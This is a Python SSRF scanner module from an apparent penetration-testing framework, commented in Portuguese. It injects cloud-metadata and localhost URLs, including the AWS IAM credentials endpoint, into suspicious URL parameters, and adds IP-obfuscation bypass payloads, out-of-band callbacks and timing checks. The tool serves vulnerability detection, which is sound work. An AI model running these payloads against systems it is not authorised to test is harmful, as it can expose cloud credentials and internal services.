#!/usr/bin/env python3
"""
SSRF Scanner — Validação ativa de Server-Side Request Forgery.

Fluxo de validação multi-camada para eliminar falsos positivos:
  1. Detecção: identifica URLs com parâmetros suspeitos (url, redirect, src, callback...)
  2. Validação OOB (OAST): injeta payloads com interactsh e verifica callbacks
  3. Validação Reflected: injeta URLs internas e verifica se resposta contém dados internos
  4. Validação por Timing: compara tempo de resposta com/sem payload interno
  5. Classificação: só reporta com evidência concreta (OOB callback OU dados internos)
"""
import json
import time
import re
from pathlib import Path
from urllib.parse import urlparse, urlencode, parse_qs, urlunparse
from concurrent.futures import ThreadPoolExecutor, as_completed

from menu import C
from plugins import ensure_outdir
from plugins.validation import finding
from ..output import info, success, warn, error
from ..http_utils import format_http_request, format_http_response

# ============================================================
# PARAMS SUSPEITOS DE SSRF
# ============================================================
SSRF_PARAMS = {
    "url", "uri", "src", "source", "dest", "destination", "redirect",
    "next", "target", "rurl", "return", "return_url", "redirect_url",
    "redirect_uri", "callback", "webhook", "proxy", "fetch", "load",
    "link", "page", "feed", "host", "site", "html", "val", "path",
    "continue", "window", "data", "reference", "ref", "img", "image",
    "to", "out", "view", "dir", "show", "navigation", "open",
}

# Payloads internos para detecção reflected
INTERNAL_PAYLOADS = [
    # AWS Metadata (IMDSv1)
    {"payload": "http://169.254.169.254/latest/meta-data/", "marker": "ami-id", "label": "AWS IMDSv1"},
    {"payload": "http://169.254.169.254/latest/meta-data/iam/security-credentials/", "marker": "AccessKeyId", "label": "AWS IAM Creds"},
    # GCP Metadata
    {"payload": "http://metadata.google.internal/computeMetadata/v1/", "marker": "attributes", "label": "GCP Metadata"},
    # Azure Metadata
    {"payload": "http://169.254.169.254/metadata/instance?api-version=2021-02-01", "marker": "compute", "label": "Azure Metadata"},
    # Generic internal
    {"payload": "http://127.0.0.1/", "marker": "<html", "label": "Localhost"},
    {"payload": "http://[::1]/", "marker": "<html", "label": "IPv6 Localhost"},
    {"payload": "http://0.0.0.0/", "marker": "<html", "label": "0.0.0.0"},
    # Cloud interno
    {"payload": "http://169.254.169.254/", "marker": "meta-data", "label": "Cloud Metadata"},
]

# Bypass payloads (obfuscação de IP para evadir filtros)
BYPASS_PAYLOADS = [
    "http://0x7f000001/",          # Hex
    "http://2130706433/",          # Decimal
    "http://017700000001/",        # Octal
    "http://127.1/",              # Short form
    "http://127.0.0.1:80/",
    "http://127.0.0.1:443/",
    "http://[0:0:0:0:0:ffff:127.0.0.1]/",  # IPv6 mapped
]


def _inject_param(url: str, param: str, payload: str) -> str:
    """Injeta payload em um parâmetro específico da URL."""
    parsed = urlparse(url)
    qs = parse_qs(parsed.query, keep_blank_values=True)
    qs[param] = [payload]
    new_query = urlencode(qs, doseq=True)
    return urlunparse(parsed._replace(query=new_query))


def _get_baseline(url: str, client) -> dict:
    """Obtém resposta baseline para comparação de timing e conteúdo."""
    try:
        start = time.time()
        resp = client.get(url, timeout=10)
        elapsed = time.time() - start
        return {
            "status": resp.status_code,
            "length": len(resp.text),
            "time": elapsed,
            "body_hash": hash(resp.text[:500]),
        }
    except Exception:
        return {"status": 0, "length": 0, "time": 0, "body_hash": 0}


def check_ssrf(url: str, target: str, oast_host: str = None) -> list:
    """
    Testa SSRF em uma URL com parâmetros suspeitos.
    Retorna lista de findings confirmados.
    """
    import httpx
    from core.config import DEFAULT_USER_AGENT

    parsed = urlparse(url)
    params = parse_qs(parsed.query, keep_blank_values=True)
    
    # Filtrar apenas params suspeitos
    suspect_params = {p for p in params if p.lower() in SSRF_PARAMS}
    if not suspect_params:
        return []

    findings_list = []

    try:
        with httpx.Client(timeout=15, verify=False, follow_redirects=False) as client:
            headers = {"User-Agent": DEFAULT_USER_AGENT}

            for param in suspect_params:
                baseline = _get_baseline(url, client)

                # ============================================
                # LAYER 1: OAST/OOB Callback (mais confiável)
                # ============================================
                if oast_host:
                    oast_subdomain = f"ssrf-{param}-{hash(url) % 99999}"
                    oast_url = f"http://{oast_subdomain}.{oast_host}"
                    injected = _inject_param(url, param, oast_url)

                    try:
                        resp = client.get(injected, headers=headers, timeout=12)
                        # OOB callback será verificado depois pelo poll do OAST
                        # Armazenar para correlação posterior
                        findings_list.append({
                            "url": url,
                            "param": param,
                            "type": "OOB_PENDING",
                            "payload": oast_url,
                            "oast_subdomain": oast_subdomain,
                            "injected_url": injected,
                            "response_status": resp.status_code,
                            "request_raw": format_http_request(resp.request),
                            "response_raw": format_http_response(resp),
                        })
                    except Exception:
                        pass

                # ============================================
                # LAYER 2: Reflected SSRF (dados internos na resposta)
                # ============================================
                for internal in INTERNAL_PAYLOADS:
                    injected = _inject_param(url, param, internal["payload"])
                    try:
                        resp = client.get(injected, headers=headers, timeout=12)

                        # Verificar se dados internos aparecem na resposta
                        body = resp.text.lower()
                        marker = internal["marker"].lower()

                        if marker in body and resp.status_code < 500:
                            # Verificar que NÃO é a resposta normal (falso positivo)
                            if baseline["body_hash"] != hash(resp.text[:500]):
                                findings_list.append({
                                    "url": url,
                                    "param": param,
                                    "type": "REFLECTED",
                                    "severity": "CRITICAL",
                                    "payload": internal["payload"],
                                    "label": internal["label"],
                                    "marker_found": internal["marker"],
                                    "injected_url": injected,
                                    "response_status": resp.status_code,
                                    "response_snippet": resp.text[:500],
                                    "request_raw": format_http_request(resp.request),
                                    "response_raw": format_http_response(resp),
                                    "confirmed": True,
                                })
                                break  # Um confirmed basta para este param
                    except Exception:
                        pass

                # ============================================
                # LAYER 3: Bypass payloads (se layer 2 não achou)
                # ============================================
                param_confirmed = any(
                    f.get("confirmed") and f["param"] == param
                    for f in findings_list
                )
                if not param_confirmed:
                    for bypass in BYPASS_PAYLOADS:
                        injected = _inject_param(url, param, bypass)
                        try:
                            resp = client.get(injected, headers=headers, timeout=10)
                            body = resp.text.lower()

                            # Verificar sinais de acesso interno
                            internal_markers = [
                                "<!doctype html", "apache", "nginx",
                                "index of", "meta-data", "ami-id",
                                "computemetadata",
                            ]
                            if any(m in body for m in internal_markers):
                                if baseline["body_hash"] != hash(resp.text[:500]):
                                    findings_list.append({
                                        "url": url,
                                        "param": param,
                                        "type": "BYPASS_REFLECTED",
                                        "severity": "HIGH",
                                        "payload": bypass,
                                        "label": "IP Obfuscation Bypass",
                                        "injected_url": injected,
                                        "response_status": resp.status_code,
                                        "response_snippet": resp.text[:300],
                                        "request_raw": format_http_request(resp.request),
                                        "response_raw": format_http_response(resp),
                                        "confirmed": True,
                                    })
                                    break
                        except Exception:
                            pass

                # ============================================
                # LAYER 4: Timing-based detection
                # ============================================
                if not param_confirmed:
                    # Injetar um host que vai demorar (DNS timeout)
                    slow_payload = "http://internal-nonexistent-host.localdomain:81/"
                    injected = _inject_param(url, param, slow_payload)
                    try:
                        start = time.time()
                        resp = client.get(injected, headers=headers, timeout=15)
                        elapsed = time.time() - start

                        # Se demorou significativamente mais que o baseline, pode ser SSRF
                        if elapsed > baseline["time"] + 5.0:
                            findings_list.append({
                                "url": url,
                                "param": param,
                                "type": "TIMING",
                                "severity": "MEDIUM",
                                "payload": slow_payload,
                                "label": "Timing-based SSRF (potential)",
                                "baseline_time": round(baseline["time"], 2),
                                "injected_time": round(elapsed, 2),
                                "delta": round(elapsed - baseline["time"], 2),
                                "injected_url": injected,
                                "request_raw": format_http_request(resp.request),
                                "response_raw": format_http_response(resp),
                                "confirmed": False,  # Timing only = needs manual verification
                            })
                    except Exception:
                        pass

    except Exception:
        pass

    # Filtrar: remover OOB_PENDING (serão resolvidos no run() com poll)
    # e manter apenas findings com evidência
    return findings_list


def run(context: dict):
    """Executa SSRF scan ativo em URLs com parâmetros suspeitos."""
    target = context.get("target")
    if not target:
        raise ValueError("Target required")

    info(
        f"\n🔴───────────────────────────────────────────────────────────🔴\n"
        f"   🌐 {C.BOLD}{C.CYAN}SSRF SCANNER (Active Validation){C.END}\n"
        f"   🎯 Alvo: {C.GREEN}{target}{C.END}\n"
        f"🔴───────────────────────────────────────────────────────────🔴\n"
    )

    outdir = ensure_outdir(target, "ssrf")

    # Carregar URLs com parâmetros
    from core.url_sources import primary_urls_txt_for_scan
    urls_file = primary_urls_txt_for_scan(target)
    if not urls_file.exists():
        urls_file = Path("output") / target / "urls" / "urls_200.txt"
    if not urls_file.exists():
        urls_file = Path("output") / target / "domain" / "urls_valid.txt"
    if not urls_file.exists():
        warn("⚠️ Nenhuma URL válida encontrada. Execute o módulo urls primeiro.")
        (outdir / "findings.json").write_text("[]")
        return []

    all_urls = [l.strip() for l in urls_file.read_text().splitlines() if l.strip()]

    # Filtrar apenas URLs com params suspeitos
    candidate_urls = []
    for url in all_urls:
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        if any(p.lower() in SSRF_PARAMS for p in params):
            candidate_urls.append(url)

    # Deduplicar por path+params (manter apenas 1 por pattern)
    seen_patterns = set()
    unique_candidates = []
    for url in candidate_urls:
        parsed = urlparse(url)
        pattern = f"{parsed.netloc}{parsed.path}?{'&'.join(sorted(parse_qs(parsed.query).keys()))}"
        if pattern not in seen_patterns:
            seen_patterns.add(pattern)
            unique_candidates.append(url)

    if not unique_candidates:
        info("   ✅ Nenhuma URL com parâmetros suspeitos de SSRF encontrada.")
        (outdir / "findings.json").write_text("[]")
        return []

    info(f"   📋 {len(unique_candidates)} URLs com parâmetros suspeitos de SSRF")

    # Iniciar OAST client (se disponível)
    oast_host = None
    oast_client = None
    try:
        from core.oast import OastClient
        import shutil
        if shutil.which("interactsh-client"):
            oast_client = OastClient()
            oast_host = oast_client.start(timeout=30)
            if oast_host:
                info(f"   🔔 OAST ativo: {C.GREEN}{oast_host}{C.END}")
            else:
                warn("   ⚠️ OAST não iniciou. Usando apenas validação reflected/timing.")
        else:
            warn("   ⚠️ interactsh-client não encontrado. Usando apenas validação reflected/timing.")
    except Exception as e:
        warn(f"   ⚠️ OAST indisponível: {e}")

    # Executar em paralelo (limitado para não abusar)
    all_findings = []
    with ThreadPoolExecutor(max_workers=5) as executor:
        futures = {
            executor.submit(check_ssrf, url, target, oast_host): url
            for url in unique_candidates[:100]  # Limitar a 100 URLs
        }
        for future in as_completed(futures):
            try:
                results = future.result()
                if results:
                    all_findings.extend(results)
            except Exception:
                pass

    # Aguardar OOB callbacks (se OAST ativo)
    oob_confirmed = []
    if oast_client and oast_host:
        info(f"   ⏳ Aguardando OOB callbacks (15s)...")
        time.sleep(15)
        interactions = oast_client.poll()

        for interaction in interactions:
            # Correlacionar com findings OOB_PENDING
            for f in all_findings:
                if f.get("type") == "OOB_PENDING":
                    subdomain = f.get("oast_subdomain", "")
                    if subdomain and subdomain in str(interaction):
                        f["type"] = "OOB_CONFIRMED"
                        f["severity"] = "CRITICAL"
                        f["confirmed"] = True
                        f["oast_interaction"] = interaction
                        f["label"] = "Blind SSRF via OOB Callback"
                        oob_confirmed.append(f)
                        info(
                            f"   🚨 {C.RED}[CRITICAL]{C.END} "
                            f"Blind SSRF confirmado: {f['url']} "
                            f"param={f['param']} via OOB callback!"
                        )

        oast_client.stop()

    # Filtrar: remover OOB_PENDING não confirmados
    confirmed_findings = [f for f in all_findings if f.get("type") != "OOB_PENDING"]

    # Salvar resultado bruto
    raw_file = outdir / "ssrf_results.json"
    raw_file.write_text(json.dumps(confirmed_findings, indent=2, ensure_ascii=False, default=str))

    # Normalizar findings
    normalized = []
    for f in confirmed_findings:
        if not f.get("confirmed") and f.get("type") == "TIMING":
            risk, conf = "MEDIUM", "LOW"
        elif f.get("confirmed"):
            sev = f.get("severity", "HIGH")
            risk = sev
            conf = "HIGH"
        else:
            continue

        normalized.append(
            finding(
                plugin="ssrf",
                target=target,
                title=f"SSRF: {f.get('label', 'Server-Side Request Forgery')}",
                issue_type="SSRF",
                risk=risk,
                confidence=conf,
                description=(
                    f"Parâmetro '{f.get('param')}' aceita URL externa. "
                    f"Payload: {f.get('payload', '')} | "
                    f"Tipo: {f.get('type', '')}"
                ),
                url=f.get("url", ""),
                detection={"param": f.get("param"), "payload": f.get("payload")},
                validation={
                    "type": f.get("type"),
                    "confirmed": f.get("confirmed", False),
                    "marker_found": f.get("marker_found", ""),
                },
                evidence={
                    "request_raw": f.get("request_raw", ""),
                    "response_raw": f.get("response_raw", ""),
                    "response_snippet": f.get("response_snippet", ""),
                    "observable_impact": f.get("label", ""),
                },
                metadata=f,
            )
        )

    (outdir / "findings.json").write_text(json.dumps(normalized, indent=2, ensure_ascii=False, default=str))

    # Resumo
    confirmed_count = sum(1 for f in confirmed_findings if f.get("confirmed"))
    timing_count = sum(1 for f in confirmed_findings if f.get("type") == "TIMING")

    if confirmed_count:
        success(f"\n   🚨 {C.RED}{confirmed_count} SSRF CONFIRMADOS{C.END}")
        for f in confirmed_findings:
            if f.get("confirmed"):
                sev = f.get("severity", "HIGH")
                color = C.RED if sev == "CRITICAL" else C.YELLOW
                info(f"   {color}[{sev}]{C.END} {f['url']} → param={f['param']} ({f.get('label', '')})")

    if timing_count:
        info(f"   ⏱️  {timing_count} potenciais SSRF por timing (verificação manual recomendada)")

    if not confirmed_count and not timing_count:
        info("   ✅ Nenhum SSRF detectado.")

    success(f"   📂 Resultados salvos em {outdir}/")
    return normalized
